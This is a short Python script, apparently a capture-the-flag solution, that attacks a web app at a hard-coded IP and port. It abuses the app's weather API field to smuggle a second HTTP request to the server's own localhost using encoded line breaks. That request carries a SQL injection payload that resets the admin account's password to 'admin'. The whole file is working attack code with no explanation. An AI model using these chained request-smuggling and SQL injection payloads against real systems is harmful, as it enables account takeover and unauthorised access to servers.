import requests

# Target URL
url = "http://46.101.48.208:30911"

# For SQLi
username = "admin"
password = "doesntmatter') ON CONFLICT(username) DO UPDATE SET password ='admin';--"
parsed_password = password.replace(" ", "\u0120").replace("'", "%27")
content_length = len(username) + len(parsed_password) + 19

parsed_space = '\u0120'
parsed_newline = '\u010D\u010A'

endpoint = f'127.0.0.1/{parsed_newline}Host:{parsed_space}127.0.0.1{parsed_newline}{parsed_newline}POST{parsed_space}/register{parsed_space}\
HTTP/1.1{parsed_newline}Host:{parsed_space}127.0.0.1{parsed_newline}Content-Type:{parsed_space}application/x-www-form-urlencoded{parsed_newline}Content-Length:{parsed_space}'\
+ str(content_length) + f'{parsed_newline}{parsed_newline}username=' + username + '&password=' + parsed_password + f'{parsed_newline}{parsed_newline}GET{parsed_space}'

r = requests.post(url + '/api/weather', json={'endpoint':endpoint, 'city':'test','country':'test1'})
print(r.text)
